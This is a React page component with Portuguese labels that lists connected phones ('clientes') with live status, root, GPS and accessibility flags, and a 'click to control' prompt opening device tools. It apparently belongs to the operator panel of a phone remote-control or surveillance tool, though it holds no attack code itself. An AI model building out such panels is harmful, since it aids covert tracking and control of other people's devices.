import { useState, useEffect } from "react";
import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";
import { useListDevices, getListDevicesQueryKey } from "@workspace/api-client-react";
import { useSocket } from "@/hooks/use-socket";
import { useQueryClient } from "@tanstack/react-query";
import DeviceTools from "@/components/device-tools";

const G = "#00ff88";
const RED = "#ff3333";

function StatusDot({ status }: { status: string }) {
  const color = status === "online" ? G : status === "idle" ? "#ffaa00" : "#ff3333";
  return (
    <span
      style={{
        display: "inline-block",
        width: 8,
        height: 8,
        borderRadius: "50%",
        background: color,
        boxShadow: `0 0 6px ${color}`,
        flexShrink: 0,
      }}
    />
  );
}

function DeviceCard({ device, onClick }: { device: any; onClick: () => void }) {
  const isOnline = device.status === "online" || device.status === "idle";
  return (
    <div
      onClick={onClick}
      style={{
        border: `1px solid ${isOnline ? "#1a3a20" : "#1a1a1a"}`,
        background: isOnline ? "#020e05" : "#050505",
        borderRadius: 4,
        padding: "12px",
        cursor: "pointer",
        transition: "all 0.15s",
        position: "relative",
        overflow: "hidden",
      }}
      onMouseEnter={(e) => {
        e.currentTarget.style.borderColor = G;
        e.currentTarget.style.boxShadow = `0 0 12px ${G}22`;
      }}
      onMouseLeave={(e) => {
        e.currentTarget.style.borderColor = isOnline ? "#1a3a20" : "#1a1a1a";
        e.currentTarget.style.boxShadow = "none";
      }}
    >
      {/* Phone icon */}
      <div style={{ textAlign: "center", marginBottom: 8 }}>
        <div
          style={{
            width: 36,
            height: 60,
            border: `2px solid ${isOnline ? G : "#333"}`,
            borderRadius: 6,
            margin: "0 auto",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            background: "#000",
            position: "relative",
          }}
        >
          <div
            style={{
              position: "absolute",
              top: 4,
              width: 10,
              height: 2,
              background: isOnline ? G : "#333",
              borderRadius: 1,
            }}
          />
          <div style={{ fontSize: 16 }}>📱</div>
          {isOnline && (
            <div
              style={{
                position: "absolute",
                top: -4,
                right: -4,
                width: 10,
                height: 10,
                borderRadius: "50%",
                background: G,
                boxShadow: `0 0 8px ${G}`,
              }}
            />
          )}
        </div>
      </div>

      {/* Device name */}
      <div style={{ fontSize: 10, fontWeight: "bold", color: G, textAlign: "center", letterSpacing: "0.08em", marginBottom: 4, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
        {device.name}
      </div>

      {/* Status */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 5, marginBottom: 6 }}>
        <StatusDot status={device.status} />
        <span style={{ fontSize: 8, color: "#667", letterSpacing: "0.1em" }}>
          {device.status?.toUpperCase()}
        </span>
      </div>

      {/* Capabilities */}
      <div style={{ display: "flex", gap: 3, flexWrap: "wrap", justifyContent: "center" }}>
        {device.hasRoot && (
          <span style={{ fontSize: 7, padding: "1px 4px", border: "1px solid #ff8800", color: "#ff8800", borderRadius: 2 }}>ROOT</span>
        )}
        {device.gpsActive && (
          <span style={{ fontSize: 7, padding: "1px 4px", border: `1px solid ${G}`, color: G, borderRadius: 2 }}>GPS</span>
        )}
        {device.accessibilityOn && (
          <span style={{ fontSize: 7, padding: "1px 4px", border: "1px solid #44aaff", color: "#44aaff", borderRadius: 2 }}>ACC</span>
        )}
        {device.batteryLevel != null && (
          <span style={{ fontSize: 7, padding: "1px 4px", border: "1px solid #666", color: "#888", borderRadius: 2 }}>
            🔋{device.batteryLevel}%
          </span>
        )}
      </div>

      {/* Model */}
      {device.model && (
        <div style={{ fontSize: 8, color: "#445", textAlign: "center", marginTop: 4, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
          {device.model}
        </div>
      )}

      {/* Click hint */}
      {isOnline && (
        <div style={{ fontSize: 7, color: "#334", textAlign: "center", marginTop: 6, letterSpacing: "0.08em" }}>
          [ CLIQUE PARA CONTROLAR ]
        </div>
      )}
    </div>
  );
}

export default function Clientes() {
  const { data: devices = [], isLoading } = useListDevices();
  const socket = useSocket();
  const queryClient = useQueryClient();
  const [selectedDevice, setSelectedDevice] = useState<any>(null);
  const [filter, setFilter] = useState<"all" | "online" | "offline">("all");

  useEffect(() => {
    const handle = (data: { deviceId: number; status: string }) => {
      queryClient.setQueryData(getListDevicesQueryKey(), (old: any) => {
        if (!old) return old;
        return old.map((d: any) => d.id === data.deviceId ? { ...d, status: data.status } : d);
      });
    };
    socket.on("device:status", handle);
    return () => { socket.off("device:status", handle); };
  }, [socket, queryClient]);

  const filtered = devices.filter((d: any) => {
    if (filter === "online") return d.status === "online" || d.status === "idle";
    if (filter === "offline") return d.status === "offline";
    return true;
  });

  const onlineCount = devices.filter((d: any) => d.status === "online" || d.status === "idle").length;

  if (selectedDevice) {
    return (
      <Layout>
        <DeviceTools device={selectedDevice} onBack={() => setSelectedDevice(null)} />
      </Layout>
    );
  }

  return (
    <Layout>
      <TopBar title="CLIENTES // DISPOSITIVOS CONECTADOS">
        <span style={{ color: G }}>{onlineCount} ONLINE</span>
        <span style={{ color: "#445" }}>|</span>
        <span style={{ color: "#667" }}>{devices.length} TOTAL</span>
      </TopBar>

      {/* Filters */}
      <div style={{ display: "flex", gap: 6, marginBottom: 12 }}>
        {(["all", "online", "offline"] as const).map((f) => (
          <button
            key={f}
            onClick={() => setFilter(f)}
            style={{
              background: filter === f ? G : "transparent",
              color: filter === f ? "#000" : "#445",
              border: `1px solid ${filter === f ? G : "#223"}`,
              fontSize: 9,
              padding: "3px 10px",
              cursor: "pointer",
              fontFamily: "inherit",
              letterSpacing: "0.1em",
              fontWeight: "bold",
            }}
          >
            {f === "all" ? "TODOS" : f === "online" ? "ONLINE" : "OFFLINE"}
          </button>
        ))}
      </div>

      {isLoading ? (
        <div style={{ color: "#445", fontSize: 11, padding: 20 }}>&gt; CARREGANDO DISPOSITIVOS...</div>
      ) : filtered.length === 0 ? (
        <Panel>
          <div style={{ padding: 40, textAlign: "center", color: "#334", fontSize: 10 }}>
            &gt; NENHUM DISPOSITIVO {filter !== "all" ? filter.toUpperCase() : ""} ENCONTRADO
          </div>
        </Panel>
      ) : (
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fill, minmax(140px, 1fr))",
            gap: 10,
          }}
        >
          {filtered.map((device: any) => (
            <DeviceCard
              key={device.id}
              device={device}
              onClick={() => setSelectedDevice(device)}
            />
          ))}
        </div>
      )}
    </Layout>
  );
}
